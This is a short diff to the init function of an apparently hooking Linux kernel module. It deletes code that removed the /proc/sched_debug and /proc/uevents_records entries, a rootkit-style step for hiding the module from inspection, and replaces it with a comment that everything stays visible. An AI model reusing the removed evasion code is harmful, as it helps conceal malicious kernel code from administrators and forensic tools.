@@ -400,14 +400,7 @@ static int __init my_module_init(void) {
             return mret;
     }
     
-    if (!IS_ERR(filp_open("/proc/sched_debug", O_RDONLY, 0))) {
-        THOOK_LOG("removing /proc/sched_debug\n");
-        remove_proc_subtree("sched_debug", NULL);
-    }
-    if (!IS_ERR(filp_open("/proc/uevents_records", O_RDONLY, 0))) {
-        THOOK_LOG("removing /proc/uevents_records\n");
-        remove_proc_entry("uevents_records", NULL);
-    }
+    /* No proc entries are removed: this build keeps everything visible. */
 
     
     /* Keep the module visible so a rebuild can be rmmod'ed instead of
